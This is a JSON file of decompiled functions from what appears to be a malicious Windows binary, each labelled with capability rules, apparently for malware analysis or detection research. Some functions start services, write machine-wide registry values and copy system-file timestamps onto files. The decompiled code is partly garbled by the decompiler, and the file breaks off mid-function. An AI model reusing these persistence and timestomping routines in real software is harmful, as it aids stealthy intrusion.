{
    "004010c0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011dc) overlaps instruction at (ram,0x004011db)\n// \n// WARNING: Removing unreachable block (ram,0x004011dc)\n\nuchar * fcn.004010c0(uint32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint32_t extraout_ECX;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    bool bVar12;\n    \n    puVar7 = &stack0xfffffffc;\n    uVar4 = fcn.00402170(0, param_1);\n    uVar10 = uVar4;\n    bVar12 = false;\n    puVar9 = &stack0xfffffffc;\n    if ((uVar10 != 0) && (puVar9 = &stack0xfffffffc,  uVar10 == 0)) {\n        puVar8 = &stack0xffffffec;\n        puVar9 = &stack0xffffffec;\n        cVar3 = '\\x10';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar7;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n    }\n    iVar5 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(param_1);\n    if ((bVar12) || (uVar6 = extraout_ECX,  !bVar12)) {\n        uVar6 = *(iVar5 + 0x58);\n    }\n    uVar1 = *(param_1 + 0xe58be73);\n    if (uVar4 < uVar6) {\n        uVar10 = (uVar4 - uVar6 & 0xffff) - 1;\n    }\n    else {\n        uVar10 = uVar10 - (uVar6 & 0xffff);\n    }\n    uVar4 = uVar6 >> 0x10;\n    if (uVar10 < uVar4) {\n        if (uVar4 < uVar10) {\n            uVar10 = uVar10 & 0xffff;\n        }\n        iVar5 = (uVar10 - (uVar6 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar5 = uVar10 - (uVar6 >> 0x10);\n    }\n    iVar2 = *(puVar9 + 0xc);\n    iVar11 = iVar5 + iVar2;\n    **(puVar9 + 0x14) = iVar11;\n    if ((SCARRY4(iVar5, iVar2) == iVar11 < 0) && (SCARRY4(iVar5, iVar2) != iVar11 < 0)) {\n        out(0xc4, iVar2);\n        *(param_1 ^ uVar1) = iVar2;\n    }\n    **(puVar9 + 0x10) = *(puVar9 + 0x584b8bce);\n    return puVar9 + 0x584b8b76;\n}\n",
        "token_count": 730
    },
    "00402170": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402206) overlaps instruction at (ram,0x00402202)\n// \n// WARNING: Removing unreachable block (ram,0x004021b9)\n// WARNING: Removing unreachable block (ram,0x004021a4)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t fcn.00402170(uint32_t param_1, uint16_t *param_2, int32_t param_3)\n\n{\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar1;\n    \n    if (param_3 != 0) {\n        do {\n            param_1 = param_1 + *param_2;\n            bVar1 = param_1 >> 0x10 != 0;\n            if (bVar1) {\n                if ((bVar1) && (!bVar1)) {\n                    *unaff_EDI = *unaff_ESI;\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                param_1 = (param_1 >> 0x10) + (param_1 & 0xffff);\n            }\n            param_2 = param_2 + 1;\n            param_3 = param_3 + -1;\n        } while (param_3 != 0);\n    }\n    return (param_1 >> 0x10) + param_1;\n}\n",
        "token_count": 324
    },
    "null": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004025a0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004025a0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0x3f);\n    uVar1 = fcn.00402d90(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 107
    },
    "00403560": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403683) overlaps instruction at (ram,0x00403681)\n// \n// WARNING: Removing unreachable block (ram,0x00403623)\n// WARNING: Removing unreachable block (ram,0x00403625)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403560(uint arg_8h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char cVar4;\n    char cVar5;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar3 = &var_20fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    puVar3 = &s + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x41107c, &lpBuffer, arg_8h);\n    cVar5 = '\\0';\n    cVar4 = '\\0';\n    uVar1 = fcn.004039a0(&var_4h, &var_8h);\n    if ((cVar5 == cVar4) && (cVar5 != cVar4)) {\n        *(puVar3 + 3U | &stack0xfffffffc) = uVar1;\n    }\n    fcn.004036a0(var_4h);\n    iVar2 = fcn.004011f0(&s, 0x41109c, var_4h, var_8h);\n    if (iVar2 != 0) {\n        if ((-1 < iVar2) && (-1 >= iVar2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        fcn.00402800(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 601
    },
    "00401850": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b81) overlaps instruction at (ram,0x00401b80)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00401850(void)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint16_t extraout_CX;\n    uint16_t extraout_CX_00;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    uint extraout_ECX_03;\n    char extraout_DH;\n    int16_t extraout_DX;\n    char *unaff_EBX;\n    char *pcVar4;\n    uint32_t *puVar5;\n    uint32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar6;\n    uint *unaff_EDI;\n    uchar uVar7;\n    bool bVar8;\n    bool bVar9;\n    char cVar10;\n    char cVar11;\n    ulong uVar12;\n    uint *puVar13;\n    uint in_stack_ffffffdc;\n    uint uVar14;\n    \n    fcn.00401030(0x411050, 0x15, 0x411068, 0x11);\n    fcn.00401030(0x411050, 0x15, 0x411284, 0xf);\n    fcn.00401030(0x411050, 0x15, 0x411294, 0x1a);\n    uVar7 = false;\n    bVar8 = (((extraout_CX & 0x4ed ^ 0x3f6f) >> 8) + extraout_DH & 0x5bU) == 0;\n    uVar14 = 0x401905;\n    iVar3 = fcn.00401030(0x411050, 0x15, 0x4112e8, 10);\n    if ((uVar7 || bVar8) || (!uVar7 && !bVar8)) {\n        uVar14 = 0xb;\n        in_stack_ffffffdc = 0x4112f4;\n    }\n    else {\n        cVar10 = *unaff_EBX;\n        *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffe4;\n        unaff_EBP = unaff_EBP | *(iVar3 + -0xc);\n        uVar7 = CARRY1(iVar3, *(extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - cVar10, extraout_ECX)));\n    }\n    fcn.00401030(0x411050, 0x15, in_stack_ffffffdc, uVar14);\n    uVar14 = fcn.00401030(0x411050, 0x15, 0x411300, 8);\n    if ((!uVar7) && (uVar7)) {\n        out(0xbd, uVar14);\n        return;\n    }\n    fcn.00401030(0x411050, 0x15, 0x411308, 9);\n    fcn.00401030(0x411050, 0x15, 0x411314, 9);\n    fcn.00401030(0x411050, 0x15, 0x411320, 9);\n    puVar13 = unaff_ESI;\n    fcn.00401030(0x411050, 0x15, 0x41132c, 0xc);\n    fcn.00401030(0x411050, 0x15, 0x411338, 3);\n    fcn.00401030(0x411050, 0x15, 0x41133c, 10);\n    cVar11 = '\\0';\n    cVar10 = '\\0';\n    bVar8 = (unaff_EBX & 0x4d) == 0;\n    uVar14 = 0x401a72;\n    uVar12 = fcn.00401030(0x411050, 0x15, 0x411348, 0x40);\n    if ((bVar8 || cVar11 != cVar10) || (!bVar8 && cVar11 == cVar10)) {\n        uVar14 = 0xc;\n        unaff_EBP = 0x411388;\n        puVar13 = 0x15;\n    }\n    pcVar4 = unaff_EBX + 1;\n    puVar2 = uVar12 + 0x6a39da56;\n    *puVar2 = *puVar2 ^ extraout_ECX_00;\n    *pcVar4 = uVar12 >> 0x20;\n    pcVar1 = (uVar12 >> 0x20) + 0x15;\n    *pcVar1 = *pcVar1 + (extraout_ECX_00 + 1 >> 8);\n    fcn.00401030(0x411050, puVar13, unaff_EBP, uVar14);\n    fcn.00401030(0x411050, 0x15, 0x411394, 0xb);\n    bVar8 = false;\n    uVar7 = 0;\n    bVar9 = (extraout_DX - 1U & extraout_CX_00) == 0;\n    fcn.00401030(0x411050, 0x15, 0x4113a0, 4);\n    if (!bVar8 && !bVar9) {\n        pcVar4 = pcVar4 & 0xffff00ff;\n    }\n    uVar14 = 0x401b19;\n    fcn.00401030(0x411050, 0x15, 0x4113a4, 4);\n    if ((uVar7) || (!uVar7)) {\n        uVar14 = 0xc;\n    }\n    bVar8 = false;\n    bVar9 = (extraout_ECX_01 & *(extraout_ECX_01 + 0x87cb1757)) == 0;\n    uVar12 = fcn.00401030(0x411050, 0x15, 0x4113a8, uVar14);\n    puVar13 = uVar12;\n    if (!bVar8 && !bVar9) {\n        pcVar4 = pcVar4 & 0xffff00ff;\n    }\n    puVar6 = unaff_ESI + 1;\n    *unaff_EDI = *unaff_ESI;\n    pcVar1 = (uVar12 >> 0x20) + 0x15;\n    *pcVar1 = *pcVar1 + (extraout_ECX_02 + 1 >> 8);\n    puVar13[-1] = 0x411050;\n    puVar13[-2] = 0x401b70;\n    fcn.00401030(puVar13[-1], *puVar13, puVar13[1], puVar13[2]);\n    puVar5 = puVar13 + 0xf;\n    if ((SCARRY4(puVar13 + -1, 0x40)) || (puVar13[0xe] = extraout_ECX_03,  !SCARRY4(puVar13 + -1, 0x40))) {\n        puVar13[0xe] = 9;\n        puVar5 = puVar13 + 0xd;\n        puVar13[0xd] = 0x4113b8;\n    }\n    else {\n        unaff_EDI[1] = *puVar6;\n        puVar6 = unaff_ESI + 2;\n    }\n    puVar5[-1] = 0x15;\n    puVar5[-2] = 0x411050;\n    puVar5[-3] = 0x401b94;\n    uVar12 = fcn.00401030(puVar5[-2], puVar5[-1], *puVar5, puVar5[1]);\n    puVar5[1] = uVar12;\n    *puVar5 = pcVar4 & 0xffff0000 | CONCAT11(0xdf, pcVar4);\n    puVar5[-1] = uVar12 >> 0x20;\n    puVar5[1] = 0x16;\n    *puVar5 = 0x4113c4;\n    puVar5[-1] = 0x15;\n    puVar5[-2] = 0x411050;\n    puVar5[-3] = 0x401bbb;\n    uVar12 = fcn.00401030(puVar5[-2], puVar5[-1], *puVar5, puVar5[1]);\n    puVar5[1] = uVar12;\n    *puVar5 = uVar12 >> 0x20;\n    puVar5[-1] = puVar6;\n    puVar5[1] = 7;\n    *puVar5 = 0x4113dc;\n    puVar5[-1] = 0x15;\n    puVar5[-2] = 0x411050;\n    puVar5[-3] = 0x401be5;\n    fcn.00401030(puVar5[-2], puVar5[-1], *puVar5, puVar5[1]);\n    return;\n}\n",
        "token_count": 2121
    },
    "004020e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004020e0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004010c0(arg_8h, arg_ch, &var_8h, &var_4h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = var_4h;\n    fcn.004010c0(arg_8h, arg_ch, &var_8h, &var_4h);\n    return 1;\n}\n",
        "token_count": 157
    },
    "004023d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004023d0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00402ed0(0x80000002, 0x411230, 0x41127c, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 133
    },
    "00402780": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00402780(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "00402800": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402800(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t hFile;\n    \n    hFile = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x4110a0;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    if (arg_ch == -1) {\n        hFile = fcn.00404a40(arg_8h);\n        if (hFile == -1) {\n            return 0;\n        }\n    }\n    iVar2 = hFile;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(hFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1154
    },
    "00402d90": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402d90(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 243
    },
    "004030d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040320a) overlaps instruction at (ram,0x00403209)\n// \n\nuint __cdecl fcn.004030d0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    char *pcVar6;\n    code *pcVar7;\n    uint *puVar8;\n    char *pcVar9;\n    char *pcVar10;\n    bool bVar11;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar7 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar8 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    var_160h = '\\0';\n    puVar8 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    pcVar6 = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    (*pcVar7)();\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar10 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar10 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    bVar11 = false;\n    uVar4 = 0xffffffff;\n    pcVar10 = arg_8h;\n    do {\n        pcVar9 = pcVar10;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar9 = pcVar10 + 1;\n        bVar11 = *pcVar10 != '\\0';\n        cVar1 = *pcVar10;\n        pcVar10 = pcVar9;\n    } while (cVar1 != '\\0');\n    var_34h = 0x411124;\n    var_30h = 0x411130;\n    var_2ch = 0x41113c;\n    var_28h = 0x41114c;\n    var_24h = 0x411154;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((!bVar11) && (uVar5 = 4,  bVar11)) {\n        pcVar2 = !bVar11 + 0x7c8ecb0d;\n        *(pcVar6 + 0x43d1773a) = *(pcVar6 + 0x43d1773a) ^ 0x8327e95e;\n        *0x3c8d3b73 = *0x3c8d3b73 + '\\x01';\n        uVar4 = ~uVar4 - 1 & 0xffff00ff;\n        *pcVar2 = *pcVar2 + pcVar2;\n        arg_8h[0x40612c35] = arg_8h[0x40612c35] + uVar4;\n        arg_8h[-0x7447c2ac] = arg_8h[-0x7447c2ac] + uVar4;\n        pcVar10 = pcVar9 + 1;\n        pcVar7 = pcVar6 + 1;\n        *pcVar9 = *pcVar6;\n        goto code_r0x00403216;\n    }\n    if (pcVar6 < 0x5) {\n        pcVar10 = pcVar6 * 4;\n        pcVar7 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n        do {\n            uVar5 = *(&var_48h + pcVar10);\n            pcVar2 = *(&var_20h + pcVar10);\n            uVar4 = *(&var_5ch + pcVar10);\ncode_r0x00403216:\n            iVar3 = (*pcVar7)(0x80000002, &var_264h, *(&var_34h + pcVar10), uVar4, pcVar2, uVar5);\n            if (iVar3 != 0) {\n                return 0;\n            }\n            pcVar10 = pcVar10 + 4;\n        } while (pcVar10 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1447
    },
    "004022b0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402323) overlaps instruction at (ram,0x00402322)\n// \n// WARNING: Removing unreachable block (ram,0x00402313)\n// WARNING: Removing unreachable block (ram,0x0040238e)\n\nuint __cdecl fcn.004022b0(int32_t arg_8h, uint32_t arg_ch, uchar *arg_10h, uchar *arg_14h)\n\n{\n    uint in_EAX;\n    uchar *puVar1;\n    uint32_t in_EDX;\n    uint8_t uVar2;\n    uint16_t unaff_BX;\n    uchar *puVar3;\n    bool bVar4;\n    \n    puVar1 = NULL;\n    if (arg_14h != NULL) {\n        do {\n            bVar4 = ((CONCAT11(in_EAX >> 8 & in_EDX >> 8, in_EAX) * 2 | in_EDX) ^ 0x6c00) != unaff_BX;\n            puVar3 = arg_10h;\n            if ((bVar4) && (!bVar4)) {\n                puVar3 = arg_10h + 1;\n                out(*arg_10h, in_EDX);\n            }\n            uVar2 = puVar1[arg_10h] ^ *(ZEXT48(puVar1) % arg_ch + arg_8h);\n            in_EDX = ZEXT48(puVar1) % arg_ch;\n            puVar1[puVar3] = uVar2;\n            puVar1 = puVar1 + 1;\n            unaff_BX = CONCAT11(*puVar1, uVar2);\n            in_EAX = 0x41311c88;\n            arg_10h = puVar3;\n        } while (puVar1 < arg_14h);\n    }\n    return in_EAX;\n}\n",
        "token_count": 409
    },
    "00404720": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004047cd) overlaps instruction at (ram,0x004047c8)\n// \n// WARNING: This function may have set the stack pointer\n// WARNING: Removing unreachable block (ram,0x004047f0)\n// WARNING: Removing unreachable block (ram,0x004047fa)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404720(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint8_t extraout_CL;\n    uint *puVar3;\n    uchar lpszPath;\n    uint var_25fh;\n    uchar lpCommandLine;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    fcn.00401bf0();\n    iVar2 = fcn.00403f10();\n    if (iVar2 != 0) {\n        lpszPath = 0;\n        puVar3 = &var_25fh;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        iVar2 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &lpszPath, 0x26, 0);\n        if (iVar2 != 0) {\n            if ((0 < iVar2) && (iVar2 < 1)) {\n                *(iVar2 + -0x17c625aa) = *(iVar2 + -0x17c625aa) ^ extraout_CL;\n                in(0xff);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            fcn.00402d20();\n            lpCommandLine = 0;\n            puVar3 = &var_15bh;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + 2) = 0;\n    // WARNING: Could not recover jumptable at 0x0040480b. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.MSVCRT.dll_sprintf)(&lpCommandLine, 0x411404, &lpszPath, 0x4113e4, 3);\n            var_14h = 0;\n            do {\n                puVar3 = &var_58h;\n                for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 1;\n                }\n                hProcess = 0;\n                var_58h = 0x44;\n                var_ch = 0;\n                var_2ch = 1;\n                lParam = 0;\n                var_28h._0_2_ = 0;\n                var_4h = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                                  (0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                if (iVar2 == 0) {\n                    return;\n                }\n                (*_sym.imp.KERNEL32.dll_Sleep)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.00404610, lParam);\n                iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                if (iVar2 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar1)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 991
    },
    "004049b0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.004049b0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    char *pcVar6;\n    bool bVar7;\n    uint auStack24 [2];\n    \n    puVar4 = &stack0xfffffffc;\n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar2) {\n        do {\n            puVar5 = puVar4;\n            if ((arg_8h != pcVar2) && (arg_8h == pcVar2)) {\n                puVar3 = auStack24 + 1;\n                puVar5 = auStack24 + 1;\n                cVar1 = '\\x10';\n                do {\n                    puVar4 = puVar4 + -1;\n                    puVar3 = puVar3 + -1;\n                    *puVar3 = *puVar4;\n                    cVar1 = cVar1 + -1;\n                } while ('\\0' < cVar1);\n            }\n            if (*arg_8h == *arg_10h) {\n                bVar7 = true;\n                pcVar6 = arg_8h;\n                do {\n                    arg_10h = arg_10h + 1;\n                    pcVar6 = pcVar6 + 1;\n                    arg_14h = arg_14h + -1;\n                    if (arg_14h == 0) break;\n                    bVar7 = *pcVar6 == 